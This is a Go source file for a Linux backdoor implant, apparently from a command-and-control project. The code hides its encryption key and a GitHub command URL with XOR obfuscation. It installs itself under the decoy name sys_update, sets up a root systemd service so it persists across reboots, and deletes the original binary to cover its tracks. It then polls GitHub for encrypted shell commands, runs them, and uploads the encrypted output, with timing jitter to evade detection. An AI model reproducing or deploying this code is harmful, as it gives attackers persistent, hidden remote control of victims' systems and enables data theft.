package main

import (
	"c2project/pkg/encryption"
	"c2project/pkg/github"
	"fmt"
	"math/rand/v2"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"golang.org/x/sys/unix"
)

var xorKey = []byte{0xAF, 0x22, 0xC3, 0x11}  // xor mask
var xorKey2 = []byte{0x5A, 0x3C, 0x7E, 0x9D} // xor mask

// note: these are obfuscations, not encryptions

// this is a simple XOR-obfuscated version of the key (using xorKey) to obfuscate the encryption key in a compiled binary.
var scrambledKey = []byte{0x99, 0x15, 0xf5, 0x28, 0x9d, 0x15, 0xa7, 0x24, 0x9f, 0x12, 0xfb, 0x25, 0xca, 0x43, 0xf2, 0x23, 0xce, 0x47, 0xf5, 0x23, 0x9c, 0x40, 0xf4, 0x26, 0xc9, 0x40, 0xf5, 0x26, 0x9c, 0x47, 0xf4, 0x72, 0xca, 0x15, 0xa2, 0x29, 0x99, 0x17, 0xf5, 0x25, 0x9d, 0x16, 0xf4, 0x22, 0x9b, 0x43, 0xa1, 0x75, 0x99, 0x14, 0xfb, 0x22, 0xcc, 0x14, 0xa0, 0x29, 0xce, 0x11, 0xfb, 0x27, 0x9b, 0x11, 0xf7, 0x72}

// this is a simple XOR-obfuscated version of the url (using xorKey2) to the command file on github to obfuscate the url in a compiled binary
var scrambledCmdURL = []byte{0x32, 0x48, 0xa, 0xed, 0x29, 0x6, 0x51, 0xb2, 0x28, 0x5d, 0x9, 0xb3, 0x3d, 0x55, 0xa, 0xf5, 0x2f, 0x5e, 0xb, 0xee, 0x3f, 0x4e, 0x1d, 0xf2, 0x34, 0x48, 0x1b, 0xf3, 0x2e, 0x12, 0x1d, 0xf2, 0x37, 0x13, 0x2d, 0xe8, 0x28, 0x5d, 0x17, 0xf3, 0x9, 0x5d, 0x17, 0xfa, 0x3b, 0x50, 0x51, 0xfe, 0x68, 0x11, 0xe, 0xef, 0x35, 0x56, 0x1b, 0xfe, 0x2e, 0x11, 0x1b, 0xe9, 0x32, 0x55, 0x1d, 0xfc, 0x36, 0x13, 0xc, 0xf8, 0x3c, 0x4f, 0x51, 0xf5, 0x3f, 0x5d, 0x1a, 0xee, 0x75, 0x51, 0x1f, 0xf4, 0x34, 0x13, 0x1d, 0xf2, 0x37, 0x51, 0x1f, 0xf3, 0x3e, 0x4f, 0x50, 0xe9, 0x22, 0x48}

const targetPath = "/usr/local/bin/sys_update" // where we want the binary to actually be (decoy name)

func main() {
	curPath, _ := os.Executable()

	if curPath != targetPath { // we haven't installed ourself yet

		// copy binary with executable permissions to target path
		input, _ := os.ReadFile(curPath)
		if err := os.WriteFile(targetPath, input, 0755); err != nil {
			fmt.Println("Error installing:", err)
			os.Exit(1)
		}

		err := StartService(targetPath)
		if err != nil {
			fmt.Println("Error starting service:", err)
			os.Exit(1)
		}

		// delete the original binary to cover our tracks
		os.Remove(curPath)
	} else { // we're already installed and running in a service, let's commence mischief >:)
		BackdoorLoop()
	}
}

// create a service that will automatically restart the backdoor if it's killed, and more importantly, will make it run on startup to maintain persistence across reboots
func StartService(binPath string) error {
	servicePath := "/etc/systemd/system/sys_update.service"

	content := fmt.Sprintf(`[Unit]
Description=System Service Loader
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
`, binPath)

	err := os.WriteFile(servicePath, []byte(content), 0644)
	if err != nil {
		return err
	}

	// activate the service
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "sys_update.service").Run()
	exec.Command("systemctl", "start", "sys_update.service").Run()

	return nil
}

// This is the backdoor loop that continuously fetches the command file, decrypts it, executes the commands, and writes the output back to github. It includes a random delay to avoid periodicity detection. We only run once the binary has "self-installed" itself on the target machine.
func BackdoorLoop() {
	key, cmdURL := string(encryption.XORTransform(scrambledKey, xorKey)), string(encryption.XORTransform(scrambledCmdURL, xorKey2))
	for {
		lastCommandTime := GetLastCommandTime()

		commandEncrypted, err := github.ReadFile(cmdURL)
		if err != nil {
			fmt.Println("Error fetching command file:", err)
			return
		}

		commandUnencrypted, err := encryption.DecryptString(commandEncrypted, key)
		if err != nil {
			fmt.Println("Error decrypting command:", err)
			return
		}

		data := strings.Split(commandUnencrypted, "|")
		if len(data) != 2 {
			fmt.Println("Invalid command format")
			return
		}

		timestampStr := data[0]
		timestamp, err := strconv.ParseInt(timestampStr, 10, 64)
		if err != nil {
			fmt.Println("Error parsing timestamp:", err)
			return
		}

		if timestamp == lastCommandTime {
			// no new command, sleep and check again later
			SleepWithJitter()
			continue
		}

		commands := strings.Split(data[1], "\n")
		outputs := make([]string, 0, len(commands))

		// run each command and store the output
		for _, command := range commands {
			command = strings.TrimSpace(command)
			if command == "" {
				continue
			}

			run := exec.Command("sh", "-c", command)
			output, err := run.CombinedOutput()
			if err != nil {
				fmt.Println("Error executing command:", err)
			}
			outputs = append(outputs, string(output))
		}

		SetLastCommandTime(timestamp)

		// encrypt
		outputCombined := strings.Join(outputs, "\n")
		outputEncrypted, err := encryption.EncryptString(outputCombined, key)
		if err != nil {
			fmt.Println("Error encrypting output:", err)
			return
		}

		// write back to github (overwrite the command file with the encrypted output)
		err = github.WriteFile("commands.txt", commandEncrypted, outputEncrypted)

		SleepWithJitter() // go dark for a period before checking for new commands again
	}
}

func SleepWithJitter() {
	time.Sleep(time.Second * time.Duration((60 + (rand.IntN(21) - 10)))) // random delay between 50-70 seconds
}

// reads last command time from the xaddr attribute of the binary, so we don't repeat commands (and are immune to replay attacks)
func GetLastCommandTime() int64 {
	dest := make([]byte, 100)

	// read the attribute
	sz, err := unix.Getxattr(targetPath, "user.last_command_time", dest)
	if err != nil {
		// if the attribute doesn't exist yet (first run), return 0
		return 0
	}

	// sz is the exact number of bytes returned. We slice the buffer to that size.
	savedTime, err := strconv.ParseInt(string(dest[:sz]), 10, 64)
	if err != nil {
		return 0 // Return 0 if the data got corrupted
	}

	return savedTime
}

// writes last command time to the xaddr attribute of the binary
func SetLastCommandTime(timestamp int64) {
	timeStr := strconv.FormatInt(timestamp, 10)
	unix.Setxattr(targetPath, "user.last_command_time", []byte(timeStr), 0)
}
